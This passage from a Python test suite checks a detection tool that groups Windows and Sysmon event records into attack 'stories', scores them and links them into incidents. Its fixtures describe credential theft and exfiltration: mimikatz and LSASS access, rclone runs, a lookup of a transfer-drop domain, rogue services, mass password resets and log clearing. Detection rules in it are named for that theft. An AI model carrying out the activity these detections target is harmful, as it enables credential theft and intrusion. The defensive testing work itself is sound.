    for measure in (NOISY, LEAD):
        [again] = [
            s
            for s in build_stories(events, [], findings, SETTINGS, measures={"whoami": measure})["stories"]
            if s["kind"] == "person" and "it-admin" in s["title"]
        ]
        assert again["severity"] == "medium" and len(again["firm"]) == 2


def test_the_score_weighs_attack_order_and_what_each_rule_is_worth():
    me = dict(subjectUser="alice.martin", subjectDomain="NORTHSTAR", subjectLogonId="0x9001")

    def story(order, measures, repeat=1):
        """Execution, persistence and credential access, at the given minutes; the persistence rule fires `repeat` times."""
        events = [
            ev(1, order[0], eventId=4688, computer="WS-001", newProcessId="0x10", processName="C:\\Users\\Public\\run.exe", **me),
            *[ev(10 + k, order[1] + k * 0.5, eventId=4698, computer="WS-001", taskName=f"\\Updater{k}", **me) for k in range(repeat)],
            ev(3, order[2], eventId=4688, computer="WS-001", newProcessId="0x30", processName="C:\\Users\\Public\\dump.exe", **me),
        ]
        findings = [
            finding("run", "high", [1], tags=["execution"], attack=["T1204.002"]),
            *[finding("task", "high", [10 + k], tags=["persistence"], attack=["T1053.005"]) for k in range(repeat)],
            finding("dump", "high", [3], tags=["credential-access"], attack=["T1003.001"]),
        ]
        [s] = build_stories(events, [], findings, SETTINGS, measures=measures)["stories"]
        return s

    measured = {"run": DETECTS, "task": DETECTS, "dump": DETECTS}
    in_order = story((0, 10, 20), measured)
    assert [w["phase"] for w in in_order["scoreParts"]["run"]] == ["execution", "persistence", "credential-access"]
    assert in_order["score"] == 3 * 18 and in_order["scoreParts"]["weighedDown"] == 0
    # the same findings against ATT&CK's order: only one of them climbs, the others add a little
    reversed_ = story((20, 10, 0), measured)
    assert len(reversed_["scoreParts"]["run"]) == 1 and reversed_["score"] < in_order["score"]
    # a lead weighs less than a rule seen to detect what it looks for, and a noisy one less again
    lead = story((0, 10, 20), {**measured, "dump": LEAD})
    noisy = story((0, 10, 20), {**measured, "dump": NOISY})
    assert noisy["score"] < lead["score"] < in_order["score"]
    assert lead["scoreParts"]["run"][-1] | {"step": None} == {
        "phase": "credential-access",
        "technique": "T1003.001",
        "ruleId": "dump",
        "severity": "high",
        "verdict": "lead",
        "precision": 0.6,
        "weight": 3.6,
        "step": None,
    }
    assert "1 of its 3 techniques weighs less" in lead["summary"]
    # five scheduled tasks of one rule are one technique: breadth of one rule adds nothing
    many = story((0, 10, 20), measured, repeat=5)
    assert many["score"] == in_order["score"] and many["scoreParts"]["techniques"] == 3


def test_measures_read_as_the_page_reads_them(monkeypatch):
    from services.analysis.stories import measure_verdict
    from services.rules import measures

    assert measure_verdict(None) == ("unmeasured", False, 0.8)
    assert measure_verdict({"changed": True}) == ("unmeasured", False, 0.8)
    assert measure_verdict({}) == ("lead", False, 0.6)
    assert measure_verdict({"own": False, "of": 2}) == ("misses", False, 0.5)
    assert measure_verdict(DETECTS) == ("detects", False, 1.0)
    # firing on one clean machine of seven costs about a quarter, on every one of them half
    assert measure_verdict({**DETECTS, "clean": {"findings": 1, "machines": 1, "of": 7}})[2] == 0.714
    assert measure_verdict(NOISY) == ("detects", True, 0.5)
    # without measures given, a build reads rules/measures.json; a finding that carries its rule's measure keeps it
    monkeypatch.setattr(measures, "load", lambda: {"rules": {"shadow-delete": {"h": "x", **LEAD}}})
    events, findings = _admin_and_ransomware()
    ransom = next(s for s in build_stories(events, [], findings, SETTINGS)["stories"] if "eve" in s["title"])
    assert ransom["scoreParts"]["run"][0]["verdict"] == "lead"
    findings[3]["measured"] = DETECTS
    ransom = next(s for s in build_stories(events, [], findings, SETTINGS)["stories"] if "eve" in s["title"])
    assert ransom["scoreParts"]["run"][0]["verdict"] == "detects"


def _low(rules_days, user="carla.morel", host="WS-007"):
    """Low findings on one person's records: (rule, tactic, day) each."""
    me = dict(subjectUser=user, subjectDomain="NORTHSTAR", subjectLogonId="0x4401")
    events, findings = [], []
    for n, (rule, tactic, day) in enumerate(rules_days, 1):
        events.append(ev(n, day * 1440, eventId=4698, computer=host, taskName=f"\\t{n}", **me))
        findings.append(finding(rule, "low", [n], tags=[tactic]))
    return events, findings


def _built(events, findings, settings=SETTINGS):
    return build_stories(events, [], findings, settings)


def test_low_findings_of_several_rules_within_a_week_add_up_to_a_story():
    # three rules, two tactics, over five days: more than two days apart, still one story
    events, findings = _low([("recon-a", "discovery", 0), ("odd-task", "persistence", 2.5), ("recon-b", "discovery", 5)])
    res = build_stories(events, [], findings, SETTINGS, measures={})
    [story] = res["stories"]
    assert story["startKind"] == "accumulated" and story["severity"] == "low" and res["stats"]["accumulated"] == 1
    assert [st["id"] for st in story["steps"]] == ["event:1", "event:2", "event:3"]
    assert story["steps"][0]["tie"]["kind"] == "flag"
    assert story["steps"][0]["tie"]["basis"] == "findings of 3 rules on them within 7 days: the record names them (subject)"
    assert story["summary"].startswith("No finding of medium severity or more: low findings of 3 rules within 7 days add up to this story.")
    # two rules are not enough, nor three rules of one tactic; four rules are, whatever their tactics
    assert _built(*_low([("a", "discovery", 0), ("b", "persistence", 1)]))["stories"] == []
    assert _built(*_low([("a", "discovery", 0), ("b", "discovery", 1), ("c", "discovery", 2)]))["stories"] == []
    [four] = _built(*_low([("a", "discovery", 0), ("b", "discovery", 1), ("c", "discovery", 2), ("d", "discovery", 3)]))["stories"]
    assert four["startKind"] == "accumulated"
    # nor findings more than a week apart, nor one rule firing many times
    assert _built(*_low([("a", "discovery", 0), ("b", "persistence", 4), ("c", "discovery", 8)]))["stories"] == []
    assert _built(*_low([("a", "discovery", d) for d in range(6)]))["stories"] == []
    # a finding marked false positive does not count
    findings[1]["status"] = "false_positive"
    assert build_stories(events, [], findings, SETTINGS)["stories"] == []


def test_low_findings_follow_the_settings_and_start_host_stories_too():
    events, findings = _low([("recon-a", "discovery", 0), ("odd-task", "persistence", 1)])
    assert build_stories(events, [], findings, SETTINGS)["stories"] == []
    [story] = build_stories(events, [], findings, {**SETTINGS, "storiesLowRules": 2})["stories"]
    assert story["startKind"] == "accumulated"
    events, findings = _low([("recon-a", "discovery", 0), ("odd-task", "persistence", 1), ("recon-b", "discovery", 2)])
    assert build_stories(events, [], findings, {**SETTINGS, "stories_low_days": 0})["stories"] == []
    # records that name no one: the host's story
    for e in events:
        for k in ("subjectUser", "subjectDomain", "subjectLogonId"):
            e.pop(k)
    [host] = build_stories(events, [], findings, SETTINGS)["stories"]
    assert host["kind"] == "host" and host["startKind"] == "accumulated"
    assert host["steps"][0]["tie"]["basis"] == "findings of 3 rules on it within 7 days"


def test_low_findings_near_an_incident_start_no_second_story():
    events, findings = _low([("recon-a", "discovery", 0), ("odd-task", "persistence", 1), ("recon-b", "discovery", 2)])
    events.append(ev(9, 1.5 * 1440, eventId=1102, computer="WS-007", subjectUser="carla.morel", subjectDomain="NORTHSTAR", subjectLogonId="0x4401"))
    findings.append(finding("win-audit-log-cleared", "critical", [9], tags=["defense-evasion"], attack=["T1685.005"]))
    [story] = build_stories(events, [], findings, SETTINGS)["stories"]
    assert story["startKind"] == "flag" and story["severity"] == "critical"


def test_a_step_says_how_rare_it_is_in_the_case_and_the_rarest_context_is_kept_first():
    me = dict(subjectUser="alice.martin", subjectDomain="NORTHSTAR", subjectLogonId="0x9001")
    cmd = "C:\\Windows\\System32\\cmd.exe"
    sysmon = {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"}
    events = [
        ev(1, 0, eventId=4624, computer="WS-001", targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x9001", logonType=2),
        ev(2, 1, eventId=4688, computer="WS-001", newProcessId="0x10", processName="C:\\Users\\Public\\mimikatz.exe", **me),
        # cmd.exe starting conhost.exe on every host; starting rclone.exe on hers only, last
        *[ev(10 + k, 2 + k, eventId=4688, computer="WS-001", newProcessId=hex(0x20 + k), processName="C:\\Windows\\System32\\conhost.exe", parentProcessName=cmd, **me) for k in range(4)],
        ev(20, 30, eventId=4688, computer="WS-001", newProcessId="0x40", processName="C:\\Tools\\rclone.exe", parentProcessName=cmd, **me),
        *[ev(30 + k, 5, eventId=4688, computer=f"WS-00{k + 2}", newProcessId="0x50", processName="C:\\Windows\\System32\\conhost.exe", parentProcessName=cmd,
             subjectUser=f"user{k}", subjectDomain="NORTHSTAR", subjectLogonId="0x1") for k in range(3)],
        # a network logon to the file server from her host, where three others come from WS-005
        ev(40, 10, eventId=4624, computer="FS-001", targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x7001", logonType=3, workstation="WS-001", ipAddress="10.0.0.11"),
        *[ev(41 + k, 11, eventId=4624, computer="FS-001", targetUser=f"user{k}", targetDomain="NORTHSTAR", targetLogonId=hex(0x7100 + k), logonType=3, workstation="WS-005", ipAddress="10.0.0.15")
          for k in range(3)],
        # a domain only her host looked up, and one every host did
        ev(50, 12, base=sysmon, eventId=22, computer="WS-001", query="files.transfer-drop.example", user="NORTHSTAR\\alice.martin"),
        *[ev(51 + k, 12, base=sysmon, eventId=22, computer=f"WS-00{k + 1}", query="www.microsoft.com", user="NORTHSTAR\\SYSTEM") for k in range(4)],
    ]  # fmt: skip
    findings = [
        finding("win-mimikatz", "critical", [2], tags=["credential-access"]),
        finding("lateral-logon", "medium", [40], tags=["lateral-movement"]),
        finding("dns-rare", "medium", [50], tags=["command-and-control"]),
    ]
    [story] = build_stories(events, [], findings, SETTINGS, measures={})["stories"]
    by_ref = {r: s for s in story["steps"] for r in s["refs"]}
    assert by_ref["event:20"]["rarity"] == {
        "kind": "process",
        "value": "cmd.exe → rclone.exe",
        "seen": 1,
        "of": 4,
        "unit": "hosts",
        "text": "cmd.exe → rclone.exe: seen on 1 of 4 hosts",
    }
    assert by_ref["event:10"]["rarity"]["text"] == "cmd.exe → conhost.exe: seen on 4 of 4 hosts"
    assert by_ref["event:40"]["rarity"]["text"] == "ws-001 → fs-001: seen for 1 of the 4 accounts that log on to fs-001"
    assert by_ref["event:50"]["rarity"]["text"] == "transfer-drop.example: seen on 1 of 4 hosts"
    # past max_steps the programs run with no finding go, the rarest kept first whatever their time
    cut = build_stories(events, [], findings, SETTINGS, measures={}, max_steps=len(story["steps"]) - 3)["stories"][0]
    kept = {r for s in cut["steps"] for r in s["refs"]}
    assert "event:20" in kept and len({"event:10", "event:11", "event:12", "event:13"} & kept) == 1


# --- one intrusion: a host's flags, links, incidents -----------------------------------------------------

SYSMON = {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"}
PS = {"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"}


def _by_ref(story):
    return {r: st for st in story["steps"] for r in st["refs"]}


def test_a_flag_that_names_no_one_joins_the_one_person_at_its_host():
    """SYSTEM's handle on LSASS while daniel's RDP session is the only one open on WS-004; a registry
    value set by the service manager a minute after daniel installed a service on FS-001; and on the
    domain controller, where daniel only opened IPC$, a task Windows updated stays the host's."""
    ws, fs, dc = "WS-004.northstar.example", "FS-001.northstar.example", "DC-01.northstar.example"
    me = dict(subjectUser="daniel.roy", subjectDomain="NORTHSTAR")
    events = [
        ev(1, 0, eventId=4624, computer=ws, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetLogonId="0x9a01", logonType=10, ipAddress="10.0.0.40"),
        ev(2, 5, eventId=4698, computer=ws, taskName="\\Updater", subjectLogonId="0x9a01", **me),
        ev(3, 65, base=SYSMON, eventId=10, computer=ws, summary="ProcessAccess C:\\Users\\Public\\x.exe -> C:\\Windows\\System32\\lsass.exe (0x1fffff)"),
        # on the file server daniel installs a service (4697 names him); the service manager's registry write names no one
        ev(4, 20, eventId=4697, computer=fs, serviceName="NSLabUpdater", serviceFile="C:\\Users\\Public\\x.exe", subjectLogonId="0x5501", **me),
        ev(5, 21, base=SYSMON, eventId=13, computer=fs, summary="Registry value set HKLM\\System\\CurrentControlSet\\Services\\NSLabUpdater\\ImagePath"),
        # on the domain controller he only opens IPC$ (every domain logon does); Windows updates a built-in task there
        ev(6, 22, eventId=5140, computer=dc, shareName="\\\\*\\IPC$", ipAddress="10.0.0.40", subjectLogonId="0x6601", **me),
        ev(7, 23, eventId=4702, computer=dc, subjectUser="DC-01$", subjectDomain="NORTHSTAR", taskName="\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask"),
    ]  # fmt: skip
    findings = [
        finding("win-scheduled-task", "high", [2], tags=["persistence"]),
        finding("win-lsass-access", "high", [3], tags=["credential-access"]),
        finding("win-service-installed-suspicious", "high", [4], tags=["persistence"]),
        finding("win-service-registry-suspicious", "high", [5], tags=["persistence"]),
        finding("win-admin-share-access", "medium", [6], tags=["discovery"]),
        finding("win-scheduled-task-suspicious-content", "high", [7], tags=["persistence"]),
    ]
    res = build_stories(events, [], findings, SETTINGS, measures=MEASURES)
    [story] = res["stories"]
    by_ref = _by_ref(story)
    assert story["subject"]["label"] == "northstar\\daniel.roy" and res["stats"]["folded"] == 2
    assert by_ref["event:3"]["tie"] == {"kind": "flag", "basis": "on ws-004 while northstar\\daniel.roy's session 0x9a01 was open", "confidence": MEDIUM}
    assert by_ref["event:5"]["tie"] == {
        "kind": "flag",
        "basis": "on fs-001 within 15 minutes of northstar\\daniel.roy's own flagged steps there, and no one else's",
        "confidence": MEDIUM,
    }
    # a share opened on the domain controller is no hand on it: the task Windows updated there is the host's, and alone a lead
    assert "event:7" not in by_ref
    assert {u["ref"]: u["why"] for u in res["unstoried"]}["event:7"] == "a host's lone lead"


def test_a_flag_on_a_host_two_people_were_on_stays_the_hosts_and_says_who_was_on():
    ws = "WS-010.northstar.example"
    events = [
        ev(1, 0, eventId=4624, computer=ws, targetUser="alice.martin", targetDomain="NORTHSTAR", targetLogonId="0x1001", logonType=2),
        ev(2, 1, eventId=4624, computer=ws, targetUser="bob.leroy", targetDomain="NORTHSTAR", targetLogonId="0x2002", logonType=10, ipAddress="10.0.0.41"),
        ev(3, 2, eventId=4698, computer=ws, taskName="\\A", subjectUser="alice.martin", subjectDomain="NORTHSTAR", subjectLogonId="0x1001"),
        ev(4, 3, eventId=4698, computer="WS-011.northstar.example", taskName="\\B", subjectUser="bob.leroy", subjectDomain="NORTHSTAR", subjectLogonId="0x3003"),
        ev(5, 40, base=SYSMON, eventId=10, computer=ws, summary="ProcessAccess C:\\Users\\Public\\x.exe -> C:\\Windows\\System32\\lsass.exe (0x1fffff)"),
    ]  # fmt: skip
    findings = [
        finding("win-scheduled-task", "high", [3], tags=["persistence"]),
        finding("win-scheduled-task", "high", [4], tags=["persistence"]),
        finding("win-lsass-dump", "critical", [5], tags=["credential-access"]),
    ]
    res = build_stories(events, [], findings, SETTINGS)
    host = next(s for s in res["stories"] if s["kind"] == "host")
    assert host["subject"]["id"] == "ws-010" and res["stats"]["folded"] == 0
    assert _by_ref(host)["event:5"]["tie"]["basis"] == (
        "a finding on ws-010 while northstar\\alice.martin and northstar\\bob.leroy were on it (a session open, or their own flagged steps there): no one person's"
    )
    # it is linked to both, weakly: no incident is made of who was logged on
    people = {s["id"]: s["subject"]["label"] for s in res["stories"] if s["kind"] == "person"}
    assert sorted((people[lk["story"]], lk["kind"], lk["confidence"]) for lk in host["links"]) == [
        ("northstar\\alice.martin", "session", "weak"),
        ("northstar\\bob.leroy", "session", "weak"),
    ]
    assert res["incidents"] == [] and all(s["incident"] is None for s in res["stories"])


def test_a_person_who_hops_into_a_host_before_its_flags_is_one_incident_with_it():
    """Daniel installs a service on FS-001 through its admin share; half an hour later a Run key is set
    there by no one. Alone it would be a lead; through the hop it is the same intrusion."""
    events, findings = _intrusion()
    events.append(ev(60, 50, base=SYSMON, eventId=13, computer="FS-001.northstar.example", summary="Registry value set HKLM\\...\\Run\\updater"))
    findings.append(finding("win-registry-run-key", "high", [60], tags=["persistence"]))
    res = build_stories(events, [], findings, SETTINGS, measures=MEASURES)
    by_kind = {s["kind"]: s for s in res["stories"]}
    host, person = by_kind["host"], by_kind["person"]
    [link] = host["links"]
    assert link["story"] == person["id"] and link["kind"] == "hop" and link["confidence"] == MEDIUM
    assert link["basis"].startswith(f"{DANIEL} reached fs-001 30 min before its first flag there (remote service:")
    assert "event:23" in link["refs"]
    assert host["standing"].startswith("a link to a person's story")
    [incident] = res["incidents"]
    assert incident["stories"] == [person["id"], host["id"]] and host["incident"] == person["incident"] == incident["id"]
    assert incident["severity"] == "critical" and incident["hosts"] == ["fs-001", "ws-004"] and incident["cut"] == 0
    # the same Run key with no hop to it is a host's lone lead
    alone = build_stories([e for e in events if e["id"] not in (23, 24)], [], findings, SETTINGS, measures=MEASURES)
    assert not [s for s in alone["stories"] if s["kind"] == "host"]
    assert {u["ref"]: u["why"] for u in alone["unstoried"]}["event:60"] == "a host's lone lead"


def _two_accounts(fp=False):
    """Daniel uses adm.roy's credentials (4648) to reach SRV-01, where adm.roy logs on and creates a task."""
    ws, srv = "WS-004.northstar.example", "SRV-01.northstar.example"
    events = [
        ev(1, 0, eventId=4624, computer=ws, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetLogonId="0x9a01", logonType=2),
        ev(2, 2, eventId=4698, computer=ws, taskName="\\Updater", subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01"),
        ev(3, 10, eventId=4648, computer=ws, subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01", targetUser="adm.roy", targetDomain="NORTHSTAR",
           targetServer="SRV-01", processName="C:\\Windows\\System32\\cmd.exe"),
        ev(4, 10.5, eventId=4624, computer=srv, targetUser="adm.roy", targetDomain="NORTHSTAR", targetLogonId="0x7001", logonType=3, workstation="WS-004", ipAddress="10.0.0.40"),
        ev(5, 12, eventId=4698, computer=srv, taskName="\\Persist", subjectUser="adm.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x7001"),
    ]  # fmt: skip
    findings = [finding("win-scheduled-task", "high", [2], tags=["persistence"]), finding("win-scheduled-task-remote", "high", [5], tags=["persistence"])]
    if fp:
        dismissed = finding("win-explicit-credentials", "medium", [3], tags=["lateral-movement"])
        dismissed["status"] = "false_positive"
        findings.append(dismissed)
    return events, findings


def test_explicit_credentials_link_the_person_who_used_them_to_the_accounts_story():
    events, findings = _two_accounts()
    res = build_stories(events, [], findings, SETTINGS)
    by = {s["subject"]["label"]: s for s in res["stories"]}
    assert set(by) == {"northstar\\daniel.roy", "northstar\\adm.roy"}
    [link] = by["northstar\\daniel.roy"]["links"]
    assert link["story"] == by["northstar\\adm.roy"]["id"] and link["kind"] == "credentials" and link["confidence"] == STRONG
    assert link["basis"].startswith("northstar\\daniel.roy used northstar\\adm.roy's account to reach srv-01 (explicit credentials:")
    [incident] = res["incidents"]
    assert set(incident["stories"]) == {s["id"] for s in res["stories"]} and incident["people"] == ["northstar\\adm.roy", "northstar\\daniel.roy"]
    # the analyst marked the explicit-credentials finding false positive: nothing links through that record
    events, findings = _two_accounts(fp=True)
    res = build_stories(events, [], findings, SETTINGS)
    assert len(res["stories"]) == 2 and all(s["links"] == [] for s in res["stories"]) and res["incidents"] == []


def test_a_program_one_person_started_for_another_links_their_stories():
    """runas: daniel's cmd.exe starts a tool as adm.roy. The tool names adm.roy only; its parent is daniel's."""
    ws = "WS-004.northstar.example"
    g1, g2 = "{11111111-2222-3333-4444-555555555555}", "{66666666-7777-8888-9999-000000000000}"
    events = [
        ev(1, 0, eventId=4624, computer=ws, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetLogonId="0x9a01", logonType=2),
        ev(2, 1, eventId=4698, computer=ws, taskName="\\Updater", subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01"),
        ev(3, 8, eventId=4624, computer=ws, targetUser="adm.roy", targetDomain="NORTHSTAR", targetLogonId="0x7777", logonType=2, logonProcess="seclogo"),
        ev(4, 9, base=SYSMON, eventId=1, computer=ws, processGuid=g1, image="C:\\Windows\\System32\\cmd.exe", user="NORTHSTAR\\daniel.roy", data={"LogonId": "0x9a01"}),
        ev(5, 10, base=SYSMON, eventId=1, computer=ws, processGuid=g2, parentProcessGuid=g1, image="C:\\Users\\Public\\tool.exe",
           parentImage="C:\\Windows\\System32\\cmd.exe", user="NORTHSTAR\\adm.roy", data={"LogonId": "0x7777"}),
    ]  # fmt: skip
    findings = [finding("win-scheduled-task", "high", [2], tags=["persistence"]), finding("win-tool", "high", [5], tags=["execution"])]
    res = build_stories(events, [], findings, SETTINGS)
    by = {s["subject"]["label"]: s for s in res["stories"]}
    [link] = by["northstar\\adm.roy"]["links"]
    assert link["story"] == by["northstar\\daniel.roy"]["id"] and link["kind"] == "process" and link["confidence"] == STRONG
    assert link["basis"] == "tool.exe on ws-004, in the story of northstar\\adm.roy, descends from cmd.exe, in the story of northstar\\daniel.roy"
    assert len(res["incidents"]) == 1


def test_a_password_reset_names_both_and_an_incident_holds_twenty_stories_at_most():
    """helpdesk.tmp resets 21 accounts' passwords (4724) and clears the log: each reset names both, the
    incident holds the twenty highest-scoring stories and says it left the other two out."""
    dc = "DC-01.northstar.example"
    me = dict(subjectUser="helpdesk.tmp", subjectDomain="NORTHSTAR", subjectLogonId="0x4401")
    events = [ev(i, i, eventId=4724, computer=dc, targetUser=f"user{i:02d}", targetDomain="NORTHSTAR", **me) for i in range(1, 22)]
    events.append(ev(50, 30, eventId=1102, computer=dc, **me))
    findings = [finding("win-password-reset", "medium", [i], tags=["persistence"]) for i in range(1, 22)]
    findings.append(finding("win-audit-log-cleared", "critical", [50], tags=["defense-evasion"], attack=["T1685.005"]))
    res = build_stories(events, [], findings, SETTINGS)
    by = {s["subject"]["label"]: s for s in res["stories"]}
    assert len(by) == 22
    victim = by["northstar\\user01"]
    [link] = victim["links"]
    assert link["story"] == by["northstar\\helpdesk.tmp"]["id"] and link["kind"] == "record" and link["confidence"] == STRONG
    assert link["basis"].startswith("one record names both, northstar\\helpdesk.tmp (subject) and northstar\\user01 (target)") or link["basis"].startswith(
        "one record names both, northstar\\user01 (target) and northstar\\helpdesk.tmp (subject)"
    )
    [incident] = res["incidents"]
    assert len(incident["stories"]) == 20 and incident["cut"] == 2 and len(incident["cutStories"]) == 2
    assert by["northstar\\helpdesk.tmp"]["id"] in incident["stories"] and res["stats"]["incidentsCut"] == 1
    # the two left out stay stories of their own, their link still shown
    for sid in incident["cutStories"]:
        left = next(s for s in res["stories"] if s["id"] == sid)
        assert left["incident"] is None and left["links"]


def test_no_link_crosses_organisations():
    """The other tenant's admin resets a Northstar account's password: one record names both, but they are two organisations."""
    dc = "DC-01.northstar.example"
    events = [
        ev(1, 0, eventId=4724, computer=dc, subjectUser="admin@other-tenant.example", subjectDomain="OTHER", targetUser="carla.morel@northstar.example", targetDomain="NORTHSTAR"),
        ev(2, 5, eventId=1102, computer="OTHER-WS-001.other-tenant.example", subjectUser="admin@other-tenant.example", subjectDomain="OTHER"),
    ]  # fmt: skip
    findings = [finding("win-password-reset", "medium", [1], tags=["persistence"]), finding("win-audit-log-cleared", "critical", [2], tags=["defense-evasion"])]
    res = build_stories(events, [], findings, SETTINGS)
    orgs = sorted(s["subject"]["org"] for s in res["stories"])
    assert orgs == ["northstar.example", "other-tenant.example"]
    assert all(s["links"] == [] for s in res["stories"]) and res["incidents"] == []


def test_a_hosts_flags_are_a_story_only_on_evidence_of_their_own():
    """A domain controller's own maintenance (a built-in task updated by its machine account, DSC's
    script blocks, a console's handle on its shell) from rules that fire on clean machines too or were
    never measured there is a lead; a measured detection quiet on clean machines, a critical finding, or
    two phases of rules not seen on clean machines is a story."""
    dc, ws = "DC-01.northstar.example", "WS-020.northstar.example"
    maintenance = [
        ev(1, 0, eventId=4702, computer=dc, subjectUser="DC-01$", subjectDomain="NORTHSTAR", taskName="\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan"),
        ev(2, 1, base=PS, eventId=4104, computer=dc, userSid="S-1-5-18", scriptBlockText="Set-Alias -Name gcim -Value Get-CimInstance"),
        ev(3, 2, base=SYSMON, eventId=10, computer=dc, summary="ProcessAccess C:\\Windows\\System32\\conhost.exe -> C:\\Windows\\System32\\cmd.exe (0x1fffff)"),
    ]  # fmt: skip
    found = [
        finding("win-scheduled-task-suspicious-content", "high", [1], tags=["persistence"]),
        finding("win-powershell-suspicious-scriptblock", "high", [2], tags=["execution"]),
        finding("win-process-access-hollowing", "medium", [3], tags=["defense-evasion"], attack=["T1055"]),
    ]
    res = build_stories(maintenance, [], found, SETTINGS, measures=MEASURES)
    assert res["stories"] == [] and res["stats"]["hostLeads"] == 1
    assert {u["ref"]: u["why"] for u in res["unstoried"]} == {f"event:{i}": "a host's lone lead" for i in (1, 2, 3)}
    # with no measure to read, three phases are three phases
    [unmeasured] = build_stories(maintenance, [], found, SETTINGS, measures={})["stories"]
    assert unmeasured["standing"].startswith("findings of medium or more in 3 phases")
    # a WMI subscription, from a rule that detects it and never fired on the clean machines, is a story
    wmi = [ev(10, 0, base=SYSMON, eventId=21, computer=ws, summary="WMI permanent event consumer/filter binding created")]
    [story] = build_stories(wmi, [], [finding("win-wmi-persistence", "high", [10], tags=["persistence"])], SETTINGS, measures=MEASURES)["stories"]
    assert story["standing"].startswith("win wmi persistence: its rule detects what it looks for")
    # so is a critical finding, whatever its rule's measure
    [story] = build_stories(wmi, [], [finding("win-wmi-persistence", "critical", [10], tags=["persistence"])], SETTINGS, measures={})["stories"]
    assert story["standing"] == "a critical finding: win wmi persistence"


# --- the domain controllers' records -------------------------------------------------------------------

DC = "DC-01.northstar.example"
GUID = "{5b482e77-15dd-f684-f093-e11c7ed66eb8}"


def _dc_intrusion():
    """A service installed on FS-001 by a network logon that names neither its address nor its
    workstation; the domain controller's ticket and WS-001's explicit credentials carry its GUID."""
    fs = "FS-001.northstar.example"
    events = [
        ev(1, 0, eventId=4624, computer=fs, targetUser="lab.admin", targetDomain="NORTHSTAR", targetLogonId="0x77", logonType=3, logonGuid=GUID, authPackage="Kerberos"),
        ev(2, 0.1, eventId=5140, computer=fs, subjectUser="lab.admin", subjectLogonId="0x77", shareName="\\\\*\\ADMIN$"),
        ev(3, 1, eventId=4697, computer=fs, subjectUser="lab.admin", subjectDomain="NORTHSTAR", subjectLogonId="0x77", serviceName="upd",
           serviceFile="C:\\Windows\\upd.exe"),
        ev(4, -0.02, eventId=4769, computer=DC, targetUser="lab.admin@NORTHSTAR.EXAMPLE", targetDomain="NORTHSTAR.EXAMPLE", serviceName="FS-001$",
           ipAddress="10.0.0.21", logonGuid=GUID, status="0x0"),
        ev(5, -0.03, eventId=4648, computer="WS-001.northstar.example", subjectUser="alice.martin", subjectDomain="NORTHSTAR", targetUser="lab.admin",
           targetDomain="NORTHSTAR", targetServer="FS-001", data={"TargetLogonGuid": GUID}),
    ]  # fmt: skip
    return events, [finding("win-service-installed-suspicious", "high", [3], tags=["persistence"])]


def test_a_hop_reads_where_it_came_from_and_which_service_it_asked_for_in_the_domain_controllers_records():
    events, findings = _dc_intrusion()
    [story] = build_stories(events, [], findings, SETTINGS)["stories"]
    assert story["kind"] == "person" and "lab.admin" in story["subject"]["label"]
    by_ref = {r: s for s in story["steps"] for r in s["refs"]}
    # the domain controller's ticket is a step of the way in, and says which service was asked for
    ticket = by_ref["event:4"]
    assert ticket["host"] == "dc-01" and ticket["tie"]["kind"] == "hop" and ticket["tie"]["confidence"] == STRONG
    assert "with a Kerberos ticket for FS-001$ from dc-01 (4769)" in ticket["tie"]["basis"]
    [hop] = [h for h in story["lineage"]["hops"] if h["to"] == "fs-001" and h["kind"] == "remote-service"]
    assert hop["from"]["host"] == "ws-001" and "(4648)" in hop["from"]["basis"]
    [session] = [s for s in story["lineage"]["sessions"] if s["host"] == "fs-001"]
    assert session["from"] == "ws-001" and [a["kind"] for a in session["auth"]] == ["explicit-credentials", "kerberos"]


def test_other_credentials_set_for_the_network_are_a_step_tying_the_two_accounts():
    ws, fs = "WS-004.northstar.example", "FS-001.northstar.example"
    me = dict(subjectUser="daniel.roy", subjectDomain="NORTHSTAR", subjectLogonId="0x9a01")
    events = [
        ev(1, 0, eventId=4624, computer=ws, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetLogonId="0x9a01", logonType=2),
        ev(2, 5, eventId=4698, computer=ws, taskName="\\Updater", **me),
        # runas /netonly: daniel's session uses admin.bob's credentials on the network, and admin.bob logs on to FS-001 from WS-004
        ev(3, 10, eventId=4624, computer=ws, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetLogonId="0x9a02", logonType=9,
           logonProcess="seclogo", targetOutboundUser="admin.bob", targetOutboundDomain="NORTHSTAR"),
        ev(4, 20, eventId=4624, computer=fs, targetUser="admin.bob", targetDomain="NORTHSTAR", targetLogonId="0x77", logonType=3, workstation="WS-004",
           ipAddress="10.0.0.4"),
        ev(5, 20.1, eventId=5140, computer=fs, subjectUser="admin.bob", subjectDomain="NORTHSTAR", subjectLogonId="0x77", shareName="\\\\*\\ADMIN$"),
        ev(6, 21, base=SCM, eventId=7045, computer=fs, serviceName="upd", serviceFile="C:\\Windows\\upd.exe"),
    ]  # fmt: skip
    findings = [
        finding("win-scheduled-task-suspicious-content", "high", [2], tags=["persistence"]),
        finding("win-service-installed-suspicious", "high", [6], tags=["persistence"]),
    ]
    stories = {s["subject"]["label"]: s for s in build_stories(events, [], findings, SETTINGS)["stories"]}
    daniel, bob = stories["northstar\\daniel.roy"], stories["northstar\\admin.bob"]
    # in daniel's story, by his name, a step as explicit credentials are, with the way it opened to FS-001
    step = {r: s for s in daniel["steps"] for r in s["refs"]}["event:3"]
    assert (step["phase"], step["phaseBasis"]) == ("lateral-movement", "used other credentials (NORTHSTAR\\admin.bob) for the network")
    assert step["tie"]["kind"] == "identity" and step["hops"]
    assert any(h["to"] == "fs-001" and h["account"] == "NORTHSTAR\\admin.bob" and h["kind"] == "explicit-credentials" for h in daniel["lineage"]["hops"])
